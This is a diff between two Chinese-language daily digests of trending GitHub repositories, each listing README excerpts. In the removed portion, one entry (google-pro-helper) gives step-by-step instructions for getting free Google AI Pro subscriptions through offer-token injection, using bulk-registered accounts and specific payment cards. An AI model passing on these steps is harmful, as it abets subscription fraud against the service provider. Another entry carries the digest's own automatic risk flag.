@@ -1,848 +1,584 @@
-📊 开源日报 — 2026-11-07
-共发现 17 个新项目（已自动过滤历史记录）
+📊 开源日报 — 2026-11-08
+共发现 12 个新项目（已自动过滤历史记录）
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#1  react/react
-    ⭐ 252307 stars  |  🍴 51831 forks  |  💻 JavaScript  |  📅 2013-05-24
-    🔗 https://github.com/react/react
+#1  sherlock-project/sherlock
+    ⭐ 101120 stars  |  🍴 11953 forks  |  💻 Python  |  📅 2018-12-24
+    🔗 https://github.com/sherlock-project/sherlock
     📡 来源: trending-daily
-    🏷️ declarative, frontend, javascript, library, react, ui
-    📝 The library for web and native user interfaces.
+    🏷️ cli, cti, cybersecurity, forensics, hacktoberfest, information-gathering, infosec, linux, osint, pentesting
+    📝 Hunt down social media accounts by username across social networks
 
     README 摘要:
-    # React &middot;     
+    Hunt down social media accounts by username across 400+ social networks
+      
     
-    React is a JavaScript library for building user interfaces.
-    
-    * **Declarative:** React makes it painless to create interactive UIs. Design simple views for each state in your application, and React will efficiently update and render just the right components when your data changes. Declarative views make your code more predictable, simpler to understand, and easier to debug.
-    * **Component-Based:** Build encapsulated components that manage their own state, then compose them to make complex UIs. Since component logic is written in JavaScript instead of templates, you can easily pass rich data through your app and keep the state out of the DOM.
-    * **Learn Once, Write Anywhere:** We don't make assumptions about the rest of your technology stack, so you can develop new features in React without rewriting existing code. React can also render on the server using Node and power mobile apps using React Native.
-    
-    Learn how to use React in your project.
+      Installation
+      &nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;
+      Usage
+      &nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;
+      Contributing
     
     ## Installation
     
-    React has been designed for gradual adoption from the start, and **you can use as little or as much React as you need**:
-    
-    * Use Quick Start to get a taste of React.
-    * Add React to an Existing Project to use as little or as much React as you need.
-    * Create a New React App if you're looking for a powerful JavaScript toolchain.
-    
-    ## Documentation
-    
-    You can find the React documentation on the website.
-    
-    Check out the Getting Started page for a quick overview.
-    
-    The documentation is divided into several sections:
-    
-    * Quick Start
-    * Tutorial
-    * Thinking in React
-    * Installation
-    * Describing the UI
-    * Adding Interactivity
-    * Managing State
-    * Advanced Guides
-    * API Reference
-    * Where to Get Support
-    * Contributing Guide
-    
-    You can improve it by sending pull requests to this repository.
-    
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#2  zed-industries/zed
-    ⭐ 93833 stars  |  🍴 11512 forks  |  💻 Rust  |  📅 2021-02-20
-    🔗 https://github.com/zed-industries/zed
-    📡 来源: trending-daily
-    🏷️ gpui, rust-lang, text-editor, zed
-    📝 Code at the speed of thought – Zed is a high-performance, multiplayer code editor from the creators of Atom and Tree-sitter.
-
-    README 摘要:
-    # Zed
-    
-    Welcome to Zed, a high-performance, multiplayer code editor from the creators of Atom and Tree-sitter.
-    
-    ---
-    
-    ### Installation
-    
-    On macOS, Linux, and Windows you can download Zed directly or install Zed via your local package manager (macOS/Linux/Windows).
-    
-    Other platforms are not yet available:
-    
-    - Web (tracking discussion)
-    
-    ### Developing Zed
-    
-    - Building Zed for macOS
-    - Building Zed for Linux
-    - Building Zed for Windows
-    
-    ### Contributing
-    
-    See CONTRIBUTING.md for ways you can contribute to Zed.
-    
-    Also... we're hiring! Check out our jobs page for open roles.
-    
-    ### Licensing
-    
-    Zed source code is licensed primarily under GPL-3.0-or-later, with Apache-2.0 components where marked.
-    
-    License information for third party dependencies must be correctly provided for CI to pass.
-    
-    We use `cargo-about` to automatically comply with open source licenses. If CI is failing, check the following:
-    
-    - Is it showing a `no license specified` error for a crate you've created? If so, add `publish = false` under `[package]` in your crate's Cargo.toml.
-    - Is the error `failed to satisfy license requirements` for a dependency? If so, first determine what license the project has and whether this system is sufficient to comply with this license's requirements. If you're unsure, ask a lawyer. Once you've verified that this system is acceptable add the license's SPDX identifier to the `accepted` array in `script/licenses/zed-licenses.toml`.
-    - Is `cargo-about` unable to find the license for a dependency? If so, add a clarification field at the end of `script/licenses/zed-licenses.toml`, as specified in the cargo-about book.
-    
-    ## Sponsorship
-    
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#3  prometheus/prometheus
-    ⭐ 67241 stars  |  🍴 10991 forks  |  💻 Go  |  📅 2012-11-24
-    🔗 https://github.com/prometheus/prometheus
-    📡 来源: trending-daily
-    🏷️ alerting, graphing, hacktoberfest, metrics, monitoring, prometheus, time-series
-    📝 The Prometheus monitoring system and time series database.
-
-    README 摘要:
-    Prometheus
-    
-    Visit prometheus.io for the full documentation,
-    examples and guides.
-    
-    [][quay]
-    [][hub]
-    
-    Prometheus, a Cloud Native Computing Foundation project, is a systems and service monitoring system. It collects metrics
-    from configured targets at given intervals, evaluates rule expressions,
-    displays the results, and can trigger alerts when specified conditions are observed.
-    
-    The features that distinguish Prometheus from other metrics and monitoring systems are:
-    
-    * A **multi-dimensional** data model (time series defined by metric name and set of key/value dimensions)
-    * PromQL, a **powerful and flexible query language** to leverage this dimensionality
-    * No dependency on distributed storage; **single server nodes are autonomous**
-    * An HTTP **pull model** for time series collection
-    * **Pushing time series** is supported via an intermediary gateway for batch jobs
-    * Targets are discovered via **service discovery** or **static configuration**
-    * Multiple modes of **graphing and dashboarding support**
-    * Support for hierarchical and horizontal **federation**
-    
-    ## Architecture overview
-    
-    ## Install
-    
-    There are various ways to install Prometheus.
-    
-    ### Precompiled binaries
-    
-    Precompiled binaries for released versions are available in the
-    *download* section
-    on prometheus.io. Using the latest production release binary
-    is the recommended way to install Prometheus.
-    See the Installing
-    chapter in the documentation for all the details.
-    
-    ### Docker images
-    
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#4  rails/rails
-    ⭐ 59058 stars  |  🍴 23833 forks  |  💻 Ruby  |  📅 2008-04-11
-    🔗 https://github.com/rails/rails
-    📡 来源: trending-daily
-    🏷️ activejob, activerecord, framework, html, mvc, rails, ruby
-    📝 Ruby on Rails
-
-    README 摘要:
-    # Welcome to Rails
-    
-    ## What's Rails?
-    
-    Rails is a web application framework that includes everything needed to
-    create database-backed web applications according to the
-    Model-View-Controller (MVC)
-    pattern.
-    
-    Understanding the MVC pattern is key to understanding Rails. MVC divides your
-    application into three layers: Model, View, and Controller, each with a specific responsibility.
-    
-    ## Model layer
-    
-    The _**Model layer**_ represents the domain model (such as Account, Product,
-    Person, Post, etc.) and encapsulates the business logic specific to
-    your application. In Rails, database-backed model classes are derived from
-    `ActiveRecord::Base`. Active Record allows you to present the data from
-    database rows as objects and embellish these data objects with business logic
-    methods.
-    Although most Rails models are backed by a database, models can also be ordinary
-    Ruby classes, or Ruby classes that implement a set of interfaces as provided by
-    the Active Model module.
-    
-    ## View layer
-    
-    The _**View layer**_ is composed of "templates" that are responsible for providing
-    appropriate representations of your application's resources. Templates can
-    come in a variety of formats, but most view templates are HTML with embedded
-    Ruby code (ERB files). Views are typically rendered to generate a controller response
-    or to generate the body of an email. In Rails, View generation is handled by Action View.
-    
-    ## Controller layer
-    
-    The _**Controller layer**_ is responsible for handling incoming HTTP requests and
-    providing a suitable response. Usually, this means returning HTML, but Rails controllers
-    can also generate XML, JSON, PDFs, mobile-specific views, and more. Controllers load and
-    manipulate models, and render view templates in order to generate the appropriate HTTP response.
-    In Rails, incoming requests are routed by Action Dispatch to an appropriate controller, and
-    controller classes are derived from `ActionController::Base`. Action Dispatch and Action Controller
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#5  etcd-io/etcd
-    ⭐ 52643 stars  |  🍴 10590 forks  |  💻 Go  |  📅 2013-07-06
-    🔗 https://github.com/etcd-io/etcd
-    📡 来源: trending-daily
-    🏷️ cncf, consensus, database, distributed-database, distributed-systems, etcd, go, key-value, kubernetes, raft
-    📝 Distributed reliable key-value store for the most critical data of a distributed system
-
-    README 摘要:
-    # etcd
-    
-    **Note**: The `main` branch may be in an *unstable or even broken state* during development. For stable versions, see [releases][github-release].
-    
-      
-      
       
     
-    etcd is a distributed reliable key-value store for the most critical data of a distributed system, with a focus on being:
+    &#8202;&#8202;
     
-    * *Simple*: well-defined, user-facing API (gRPC)
-    * *Secure*: automatic TLS with optional client cert authentication
-    * *Fast*: benchmarked 10,000 writes/sec
-    * *Reliable*: properly distributed using Raft
+    > [!WARNING]  
+    > Packages for ParrotOS and Ubuntu 24.04, maintained by a third party, appear to be __broken__.  
+    > Users of these systems should defer to `uv`/`pipx`/`pip` or Docker.
     
-    etcd is written in Go and uses the [Raft][] consensus algorithm to manage a highly-available replicated log.
+    | Method | Notes |
+    | - | - |
+    | `pipx install sherlock-project` | `pip` or `uv` may be used in place of `pipx` |
+    | `docker run -it --rm sherlock/sherlock` |
+    | `dnf install sherlock-project` | |
     
-    etcd is used in production by many companies, and the development team stands behind it in critical deployment scenarios, where etcd is frequently teamed with applications such as [Kubernetes][k8s], [locksmith][], [vulcand][], [Doorman][], and many others. Reliability is further ensured by rigorous **robustness testing**.
+    Community-maintained packages are available for Debian (>= 13), Ubuntu (>= 22.10), Homebrew, Kali, and BlackArch. These packages are not directly supported or maintained by the Sherlock Project.
     
-    See [etcdctl][etcdctl] for a simple command line client.
+    See all alternative installation methods here.
     
-    Original image credited to  xkcd.com/2347, alterations by Josh Berkus.
+    ## General usage
     
-    [raft]: https://raft.github.io/
-    [k8s]: http://kubernetes.io/
-    [doorman]: https://github.com/youtube/doorman
-    [locksmith]: https://github.com/coreos/locksmith
-    [vulcand]: https://github.com/vulcand/vulcand
-    [etcdctl]: https://github.com/etcd-io/etcd/tree/main/etcdctl
-    
-    ## Documentation
-    
-    The most common API documentation you'll need can be found here:
-    
-    * go.etcd.io/etcd/api/v3
-    * go.etcd.io/etcd/client/pkg/v3
-    * go.etcd.io/etcd/client/v3
-    * go.etcd.io/etcd/etcdctl/v3
-    * go.etcd.io/etcd/pkg/v3
-    * go.etcd.io/etcd/raft/v3
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#6  astral-sh/ruff
-    ⭐ 50756 stars  |  🍴 2616 forks  |  💻 Rust  |  📅 2022-08-09
-    🔗 https://github.com/astral-sh/ruff
-    📡 来源: trending-daily
-    🏷️ linter, pep8, python, python3, ruff, rust, rustpython, static-analysis, static-code-analysis, style-guide
-    📝 An extremely fast Python linter and code formatter, written in Rust.
-
-    README 摘要:
-    # Ruff
-    
-    **Docs** | **Playground**
-    
-    An extremely fast Python linter and code formatter, written in Rust.
-    
-      
-        
-        
-        
-      
-    
-      Linting the CPython codebase from scratch.
-    
-    - ⚡️ 10-100x faster than existing linters (like Flake8) and formatters (like Black)
-    - 🐍 Installable via `pip`
-    - 🛠️ `pyproject.toml` support
-    - 🤝 Python 3.15 compatibility
-    - ⚖️ Drop-in parity with Flake8, isort, and Black
-    - 📦 Built-in caching, to avoid re-analyzing unchanged files
-    - 🔧 Fix support, for automatic error correction (e.g., automatically remove unused imports)
-    - 📏 Over 900 built-in rules, with native re-implementations
-        of popular Flake8 plugins, like flake8-bugbear
-    - ⌨️ First-party editor integrations for VS Code and more
-    - 🌎 Monorepo-friendly, with hierarchical and cascading configuration
-    
-    Ruff aims to be orders of magnitude faster than alternative tools while integrating more
-    functionality behind a single, common interface.
-    
-    Ruff can be used to replace Flake8 (plus dozens of plugins),
-    Black, isort,
-    pydocstyle, pyupgrade,
-    autoflake, and more, all while executing tens or hundreds of
-    times faster than any individual tool.
-    
-    Ruff is actively developed and used in major open-source projects like:
-    
-    - Apache Airflow
-    - Apache Superset
-    - FastAPI
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#7  nushell/nushell
-    ⭐ 41022 stars  |  🍴 2344 forks  |  💻 Rust  |  📅 2019-05-10
-    🔗 https://github.com/nushell/nushell
-    📡 来源: trending-daily
-    🏷️ nushell, rust, shell
-    📝 A new type of shell
-
-    README 摘要:
-    # Nushell 
-    
-    A new type of shell.
-    
-    ## Table of Contents 
-    
-    - Status
-    - Learning About Nu
-    - Installation
-    - Configuration
-    - Philosophy
-      - Pipelines
-      - Opening files
-      - Plugins
-    - Goals
-    - Officially Supported By
-    - Contributing
-    - License
-    
-    ## Status
-    
-    This project has reached a minimum-viable-product level of quality. Many people use it as their daily driver, but it may be unstable for some commands. Nu's design is subject to change as it matures.
-    
-    ## Learning About Nu
-    
-    The Nushell book is the primary source of Nushell documentation. You can find a full list of Nu commands in the book, and we have many examples of using Nu in our cookbook.
-    
-    We're also active on Discord; come and chat with us!
-    
-    ## Installation
-    
-    To quickly install Nu:
-    
+    To search for only one user:
     ```bash
-    # Linux and macOS
-    brew install nushell
-    # Windows
-    winget install nushell
+    sherlock user123
     ```
     
+    To search for more than one user:
+    ```bash
+    sherlock user1 user2 user3
+    ```
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#8  mpv-player/mpv
-    ⭐ 37936 stars  |  🍴 3635 forks  |  💻 C  |  📅 2012-10-13
-    🔗 https://github.com/mpv-player/mpv
+#2  meta/astryx
+    ⭐ 14774 stars  |  🍴 1211 forks  |  💻 TypeScript  |  📅 2026-01-09
+    🔗 https://github.com/meta/astryx
     📡 来源: trending-daily
-    🏷️ audio, c, ffmpeg, mplayer, mpv, multimedia, video
-    📝 🎥 Command line media player
+    📝 An open source design system that's fully customizable and agent ready
 
     README 摘要:
-    # mpv
+    # Astryx
     
-    * External links
-    * Overview
-    * System requirements
-    * Downloads
-    * Changelog
-    * Compilation
-    * Release cycle
-    * Bug reports
-    * Contributing
-    * License
-    * Contact
+    An open source design system that's fully customizable and built for how we build now:  by people and the agents working alongside them.
     
-    ## External links
+    **Currently in Beta** · Built on React 19+ and StyleX
     
-    * Wiki
-    * User Scripts
-    * [FAQ][FAQ]
-    * Manual
+    **Docs** · **Storybook** · **Sandbox** · **Contributing** · **Discord**
     
     ## Overview
     
-    **mpv** is a free (as in freedom) media player for the command line. It supports
-    a wide variety of media file formats, audio and video codecs, and subtitle types.
+    Astryx is an open source design system that grew inside Meta over the last eight years, where it became the most-used and largest design system in the company — powering 13,000+ apps and shaped by the engineers, designers, and product teams who depend on it every day.
     
-    There is a [FAQ][FAQ].
+    It ships 150+ accessible components, brand-level theming, dark mode, ready-to-ship templates, and a CLI as one cohesive system. You import pre-built CSS and use typed React components — no build plugin, no styling library to adopt — and both people and AI assistants build with the same tooling.
     
-    Releases can be found on the [release list][releases].
+    **What makes Astryx different:**
     
-    ## System requirements
+    - **Open internals.** Components are built to be composed at any level, not locked behind a closed top-level API. The building blocks you'd reach for are exported directly, and when you need to go deeper, swizzle ejects a component's full source into your project to own.
+    - **No styling lock-in.** Astryx authors its styles with StyleX, but that's invisible to consumers. Override with `className` using Tailwind, CSS modules, or plain CSS — whatever your project already uses.
+    - **Customize without wrapping.** A theme is a set of CSS custom property overrides, so a designer can make Astryx unmistakably theirs without forking or wrapping component source.
+    - **Built for people and agents.** The API, docs, and CLI are designed together so a person and an AI assistant build the same way, from the same reference.
     
-    - A not too ancient Linux (usually, only the latest releases of distributions
-      are actively supported), Windows 10 1607 or later, or macOS 10.15 or later.
-    - A somewhat capable CPU. Hardware decoding might help if the CPU is too slow to
-      decode video in realtime, but must be explicitly enabled with the `--hwdec`
-      option.
-    - A not too crappy GPU. mpv's focus is not on power-efficient playback on
-      embedded or integrated GPUs (for example, hardware decoding is not even
-      enabled by default). Low power GPUs may cause issues like tearing, stutter,
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#9  symfony/symfony
-    ⭐ 31478 stars  |  🍴 9950 forks  |  💻 PHP  |  📅 2010-01-04
-    🔗 https://github.com/symfony/symfony
-    📡 来源: trending-daily
-    🏷️ bundle, framework, hacktoberfest, php, php-framework, symfony, symfony-bundle
-    📝 The Symfony PHP framework
-
-    README 摘要:
-    [Symfony][1] is a **PHP framework** for web and console applications and a set
-    of reusable **PHP components**. Symfony is used by thousands of web
-    applications and most of the [popular PHP projects][2].
+    ## Getting Started
     
-    Installation
-    ------------
+    Astryx requires **React 19** or later (`react` and `react-dom` are peer dependencies of `@astryxdesign/core`).
     
-    * [Install Symfony][4] with Composer (see [requirements details][3]).
-    * Symfony follows the [semantic versioning][5] strictly, publishes "Long Term
-      Support" (LTS) versions and has a [release process][6] that is predictable and
-      business-friendly.
-    
-    Sponsor
-    -------
-    
-    Symfony 8.2 is looking for [backers][27].
-    
-    Help Symfony by [sponsoring][31] its development!
-    
-    Documentation
-    -------------
-    
-    * Read the [Getting Started guide][7] if you are new to Symfony.
-    * Try the [Symfony Demo application][23] to learn Symfony in practice.
-    * Discover Symfony ecosystem in detail with [Symfony The Fast Track][26].
-    * Master Symfony with the [Guides and Tutorials][8], the [Components docs][9]
-      and the [Best Practices][10] reference.
-    
-    Community
-    ---------
-    
-    * [Join the Symfony Community][11] and meet other members at the [Symfony events][12].
-    * [Get Symfony support][13] on GitHub Discussions, Slack, etc.
-    * Follow us on [GitHub][14], [Twitter][15] and [Facebook][16].
-    * Read our [Code of Conduct][24] and meet the [CARE Team][25].
-    
-    Contributing
-    ------------
-    
-    Symfony is an Open Source, community-driven project with thousands of
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#10  openssl/openssl
-    ⭐ 31333 stars  |  🍴 11583 forks  |  💻 C  |  📅 2013-01-15
-    🔗 https://github.com/openssl/openssl
-    📡 来源: trending-daily
-    🏷️ cryptography, decryption, encryption, openssl, ssl, tls
-    📝 General purpose TLS and crypto library
-
-    README 摘要:
-    Welcome to the OpenSSL Project
-    ==============================
-    
-    [![openssl logo]][www.openssl.org]
-    
-    [![github actions ci badge]][github actions ci]
-    
-    OpenSSL is a robust, commercial-grade, full-featured Open Source Toolkit
-    for the Transport Layer Security (TLS, formerly SSL), Datagram TLS (DTLS), and QUIC protocols.
-    
-    The protocol implementations are based on a full-strength general purpose
-    cryptographic library, which can also be used stand-alone. Also included is a
-    cryptographic module validated to conform with FIPS standards.
-    
-    OpenSSL is descended from the SSLeay library developed by Eric A. Young
-    and Tim J. Hudson.
-    
-    The official Home Page of the OpenSSL Project is [www.openssl.org].
-    
-    Table of Contents
-    =================
-    
-     - Overview
-     - Download
-     - Build and Install
-     - Documentation
-     - License
-     - Support
-     - Contributing
-     - Legalities
-    
-    Overview
-    ========
-    
-    The OpenSSL toolkit includes:
-    
-    - **libssl**
-      an implementation of all TLS protocol versions up to TLSv1.3 ([RFC 8446]),
-      DTLS protocol versions up to DTLSv1.3 ([RFC 9147]) and
-      the QUIC version 1 protocol ([RFC 9000]).
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#11  ⚠️风险  JenkinWoo/sheeridVerify
-    ⚠️ 命中风险词: 绕过, cookie —— 默认归排除区，需人工确认
-    ⭐ 1138 stars  |  🍴 602 forks  |  💻 JavaScript  |  📅 2026-11-06
-    🔗 https://github.com/JenkinWoo/sheeridVerify
-    📡 来源: 🚀 5天300+星
-    📝 无描述
-
-    README 摘要:
-    # sheeridVerify · 教学与研究验证流程工作台
-    
-      
-    
-    **sheeridVerify** 是一个基于 Node.js 的验证流程学习项目，提供本地 Web 工作台、任务队列、浏览器表单交互及 HTTP 状态查询，供学校教学、学术研究和获得授权的流程测试使用。
-    
-    > **用途说明：** 本项目仅以教学与研究为目的提供。使用真实平台前应取得必要授权，遵守适用法律和平台条款；不得伪造身份、学籍或材料，不得冒用信息、骗取权益或绕过资格审核。本项目与 SheerID 及任何学校均无官方隶属或认可关系，也不保证验证成功。详情见 用途说明与免责声明，代码许可见 ISC 协议。
-    
-    ## 文档导航
-    
-    - 快速开始
-    - 工作台与接口说明
-    - Linux / Instabox 部署、更新与排错
-    - 浏览器流程说明
-    - 贡献指南 · 安全说明 · 免责声明
-    
-    ## 功能
-    
-    - 通过 fetch 读取验证状态，按当前步骤选择浏览器或材料处理流程。
-    - 在 Web 页面创建、排队、停止、恢复和删除任务；失败任务删除后可重新提交。
-    - 按配置限制并发，记录任务进度，提交后默认每 5 秒查询结果。
-    - 上传原始 PNG、JPEG、PDF 文件，不生成或修改证明材料；交互式真人验证由用户完成。
-    - 使用访问密码、会话 Cookie、来源检查及写请求令牌保护工作台接口。
-    
-    ## 快速开始
-    
-    需要 **Node.js >= 22.15** 与 npm。从 GitHub 获取源码：
+    Install Astryx, a theme, and its peer dependencies:
     
     ```bash
-    git clone https://github.com/JenkinWoo/sheeridVerify.git
-    cd sheeridVerify
+    # npm
+    npm install @astryxdesign/core @astryxdesign/theme-neutral @stylexjs/stylex
+    npm install -D @astryxdesign/cli
+    
+    # pnpm
+    pnpm add @astryxdesign/core @astryxdesign/theme-neutral @stylexjs/stylex
+    pnpm add -D @astryxdesign/cli
+    
+    # yarn
+    yarn add @astryxdesign/core @astryxdesign/theme-neutral @stylexjs/stylex
+    yarn add -D @astryxdesign/cli
     ```
-    
-    使用下载的 ZIP 时，解压后进入其中包含 `package.json` 的目录。在项目根目录安装依赖与浏览器：
-    
-    ```bash
-    npm ci
-    npm run browser:install
-    ```
-    
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#12  mmdoctor/google-pro-helper
-    ⭐ 967 stars  |  🍴 371 forks  |  💻 Python  |  📅 2026-11-05
-    🔗 https://github.com/mmdoctor/google-pro-helper
+#3  zortos293/Lichii
+    ⭐ 5993 stars  |  🍴 904 forks  |  💻 C++  |  📅 2026-10-31
+    🔗 https://github.com/zortos293/Lichii
+    📡 来源: 🚀 两周800+星
+    📝 VERY experimental Nintendo Switch 2 emulator
+
+    README 摘要:
+    # Lichii
+    
+    Lichii is an experimental, open-source Nintendo Switch and Switch 2 emulator written in C++. It builds on Eglantine, Eden, yuzu and Sudachi, preserving their contributions while developing this fork's game compatibility and renderer fixes.
+    
+    This is an independent fork, not an official release of those upstream projects. Lichii is not affiliated with Nintendo.
+    
+    Visit the official Lichii website to find games and compare community compatibility reports.
+    
+    ## Downloads and setup
+    
+    Published builds belong on this fork's releases page. The repository still uses its historical Eglantine name; the desktop application is now Lichii.
+    
+    On Windows, extract the entire build archive and run **lichii.exe**. Only use games and system files you have legally obtained. Games, keys and firmware are not included.
+    
+    ### Existing saves and settings
+    
+    The rebrand intentionally retains the existing Eden/Eglantine data directories and configuration keys. It does not move or delete saves, settings or shader caches. Back up your saves before testing experimental builds.
+    
+    ## Compatibility and issue reports
+    
+    Compatibility and performance vary by game, hardware and driver. Rendering errors, stutters and crashes remain possible. Passing automated tests does not establish that a game renders correctly, and this project makes no universal frame-rate guarantee.
+    
+    Browse community compatibility reports for results with each player's build and setup.
+    
+    Desktop reporting requires a build containing PR #303 and is not available in build 88. In builds that include it, play and stop a Switch 2 game, then right-click that game and choose **Submit compatibility report**. Only the latest session in the current Lichii process is eligible.
+    
+    Confirm the matching website catalog entry and review the editable machine, game, setup, and enabled add-on details prefilled where available. Check the public preview and give explicit consent before submitting. Nothing uploads automatically, and the native v1 reporter does not read or upload logs or files.
+    
+    When reporting an issue, include:
+    
+    - The exact build, game version, CPU, GPU and driver version.
+    - Relevant settings and steps to reproduce the problem.
+    - A screenshot and the log from the affected session, after checking it for personal information.
+    
+    Do not upload game files, keys, firmware or private account information.
+    
+    ## Building and contributing
+    
+    See the build guide, user documentation and coding guidelines. Some inherited documentation and i
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#4  NotRexed/Hookshot
+    ⭐ 2089 stars  |  🍴 196 forks  |  💻 C++  |  📅 2026-11-05
+    🔗 https://github.com/NotRexed/Hookshot
     📡 来源: 🚀 5天300+星
-    📝 无描述
+    📝 A Native Recompilation Of The Legend Of Zelda: Ocarina Of Time Nintendo Switch 2 Remake
 
     README 摘要:
-    # Google Pro Helper
+    Hookshot
+      
     
-    本仓库收录两个独立版本：浏览器扩展版与批量版，分别保留各自的目录结构和原有代码。
+    The Legend of Zelda: Ocarina of Time (Nintendo Switch 2) running natively on Windows & Linux, with no emulator.
     
-    | 版本 | 目录 | 简介 |
-    | --- | --- | --- |
-    | 浏览器扩展版 | extension | 在浏览器中使用的扩展项目，包含扩展清单、弹窗页面、脚本与图标。 |
-    | 批量版 | batch | 用于批量账号任务管理的本地控制台项目，包含网页界面、后端、启动脚本与测试。 |
+      Status |
+      How to build |
+      In-game menu |
+      How it works |
+      Want to help? |
+      Credits |
+      License
     
-    ## 目录结构
+    Hookshot is a static recompilation. The game's code is translated to C and compiled into a Windows program, the
+    console's system software is reimplemented, and the Switch 2 graphics are rebuilt on Vulkan. All of this happens
+    **on your PC, from your own copy of the game**.
     
-    ```text
-    google-pro-helper/
-    ├── extension/   # 浏览器扩展版
-    ├── batch/       # 批量版
-    ├── .gitignore
-    └── README.md
-    ```
+    Discord: https://discord.gg/DVQQJphbBf
     
-    ## 浏览器扩展版
+    > [!IMPORTANT]
+    > This repository **does not contain the game, keys or an executable**, and it does not explain how to get them. You
+    > need your own copy. Everything the build creates (`hookshot.exe`, the generated code, the shader caches and your
+    > saves) comes from your game and stays on your PC. Never share those files.
     
-    Linuxdo原帖在此:
+    ## Project status
     
-    https://linux.do/t/topic/3123997
+    Experimental. It has only been tested on **one PC** (Ryzen 5 7600X, RTX 4060 Ti 16 GB), mostly in the area at the start
+    of the game.
     
-    （💰 免费激活 Google AI Pro 12 / 24 个月」| offer token 注入）
-    
-    （我本人大部分号是用的是注册机批量搞的，原理都一样，总共整了七个目前都活过了半个月，不过被这么大批量薅，估计也活不久了）
-    
-    > **在此提示，不要用大号！！！！**
-    
-    ### **1.在chrome浏览器上点击"加载未打包的拓展程序"，注意打开开发者模式**
-    
-    ### **2.然后打开 one.google.com/plans，按照拓展里步骤，先开12月的，注意正上方的绿色提示，和右下角的提示**
-    
-    ### **3.然后选择pro套餐，进行绑卡（需要卡里有至少1u验证，u卡基本都行，测试卡：starryblu/maya/bybit/mexc/招行master/中行2233master/bitEU/wise/savo卡全都可以）付款前一定要看清，第一个步骤首月必定是0元的**
-    
-    > PS：这里需要说明如果是已经给了折扣的情况，如下图，付款时有极大概率需要付款首月的youtube会员，小心别被反薅，正常显示的都是在下个月才收费
-    
-    ### **4.然后如果不再出订购页面的话，不要着急，也不要取消订阅（其实取消了也无所谓）。**
+    | What | Status |
+    |---|---|
+    | Kokiri Forest: reaching gameplay and walking around | ✅ Works |
+    | Sound, controller, keyboard and saves | ✅ Works |
+    | In-game menu, frame generation and upscaling | ✅ Works |
+    | Black flashes while moving | ✅ Fixed in testing, more play needed |
+    | Performance without frame generation | ⚠️ About 50 fps walking, not yet a steady 60 |
+    | Models with missing pieces (doors, fences, parts of trees) | ✅ Fixed where tested, more play needed |
+    | Stutter when entering new areas | ⚠️ Still happens, mostly the first time |
+    | Ultrawide | ⚠️ The 3D keeps its shape, but the HUD is stretched and the picture is softer |
+    | Hyrule Field and the rest of the game | ❓ Not tested yet |
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#13  Sandflow-ai/sand3d
-    ⭐ 859 stars  |  🍴 102 forks  |  💻 HTML  |  📅 2026-11-03
-    🔗 https://github.com/Sandflow-ai/sand3d
+#5  mbillow/localthings
+    ⭐ 1101 stars  |  🍴 114 forks  |  💻 Python  |  📅 2026-06-30
+    🔗 https://github.com/mbillow/localthings
+    📡 来源: trending-daily
+    🏷️ coap-protocol, coap-server, custom-component, dtls, hacs, hacs-integration, home-assistant, home-automation, samsung, smartthings
+    📝 Control your Samsung appliances from Home Assistant over your home network, with no cloud account.
+
+    README 摘要:
+    # LocalThings
+    
+    **Control your Samsung appliances from Home Assistant over your home network, with no cloud account.**
+    
+    LocalThings connects Home Assistant to Samsung washers, dryers, refrigerators, air conditioners, ovens and other appliances that work with the SmartThings app. It talks to each appliance on your local network.
+    
+    - **Updates are fast.** Appliances that support push send changes as they happen. LocalThings checks the rest every 30 seconds.
+    - **It works without the internet.** After setup, LocalThings never contacts Samsung's servers.
+    - **Your data stays home.** LocalThings sends nothing to Samsung. The appliance itself still keeps its own connection to Samsung, and LocalThings doesn't change that.
+    - **Setup needs an IP address.** For most appliances, you enter the address and LocalThings works out the type and model, then creates matching controls and sensors.
+    
+    ## What it supports
+    
+    | Appliance | Appliance |
+    |---|---|
+    | Air conditioner, including multi-unit systems | Microwave |
+    | Air dresser | Oven |
+    | Air monitor | Range and range hood |
+    | Air purifier | Refrigerator, kimchi refrigerator, wine cellar |
+    | Cooktop, gas, radiant electric and induction; some models read-only | Robot vacuum, early support |
+    | Dehumidifier | Soundbar, media player, settings and status |
+    | Dishwasher | Vacuum clean station |
+    | Dryer | Washer and washer-dryer |
+    | EHS heat pump | Water purifier |
+    
+    What you see depends on what each appliance reports. Typical controls and sensors include power, program or mode selection, start, pause and stop, temperatures and setpoints, time remaining and finish time, door and child-lock state, energy use, filter status and alarms.
+    
+    Most Samsung appliances from about 2022 onward work, and so do some earlier washers, air conditioners and wall ovens that use an older local interface. See Older appliances on TCP 8888. Setup detects which interface an appliance has, and tells you if it finds none.
+    
+    If an appliance sets up but LocalThings doesn't recognize it, or a control is missing, Home Assistant shows a notice asking for a diagnostics download. That download is usually all the maintainers need to add support. See Reporting a capability gap.
+    
